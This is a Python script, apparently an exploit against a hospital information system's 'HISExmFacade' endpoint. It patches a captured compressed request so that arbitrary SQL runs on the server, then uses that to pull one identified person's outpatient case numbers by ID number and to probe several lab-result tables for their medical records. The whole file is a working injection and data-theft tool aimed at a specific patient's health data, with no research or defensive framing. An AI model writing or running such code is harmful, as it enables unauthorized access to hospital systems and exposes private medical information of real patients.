from his_client_final import HISClient
import requests
import zlib
import re

class CaseNoHunter(HISClient):
    def execute_sql(self, sql):
        #print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = CaseNoHunter()
hidno = 'C221748019'

# 1. Get OPDCASENO from OPDRXPM
print("Getting OPDCASENO from OPDRXPM...")
q = f"SELECT OPDCASENO, OPDDATE FROM OPDUSR.OPDRXPM WHERE HIDNO = '{hidno}' ORDER BY OPDDATE DESC"
res = hunter.execute_sql(q)

opd_casenos = []
if res and "<NewDataSet>" in res:
     print(res[:2000])
     matches = re.findall(r'<OPDCASENO>(.*?)</OPDCASENO>', res)
     dates = re.findall(r'<OPDDATE>(.*?)</OPDDATE>', res)
     
     if matches:
         print(f"Found {len(matches)} Case Nos.")
         for i, caseno in enumerate(matches):
             dt = dates[i] if i < len(dates) else "N/A"
             print(f"  {caseno} (Date: {dt})")
             opd_casenos.append(caseno)

# 2. Try to use these Case Nos to query Lab Tables
candidates = [
    "YAOCLOUD2013.INSPECTION",
    "PCUN.TB_LIS_RESULT",
    "PCUN.TB_RESULT",
    "INSP.INSP"
]

if opd_casenos:
    target_caseno = opd_casenos[0] # Use most recent
    print(f"\nUsing most recent OPDCASENO: {target_caseno}")
    
    for t in candidates:
        print(f"--- Querying {t} with OPDCASENO {target_caseno} ---")
        q_case = f"SELECT * FROM {t} WHERE HCASENO = '{target_caseno}'" # Assuming HCASENO column matches OPDCASENO format?
        r = hunter.execute_sql(q_case)
        if r and "<NewDataSet>" in r:
             print(f"!!! FOUND DATA IN {t} !!!")
             print(r[:2000])
        
        # Also try "CASENO" column if HCASENO fails
        q_case2 = f"SELECT * FROM {t} WHERE CASENO = '{target_caseno}'"
        r2 = hunter.execute_sql(q_case2)
        if r2 and "<NewDataSet>" in r2:
             print(f"!!! FOUND DATA IN {t} (CASENO) !!!")
             print(r2[:2000])

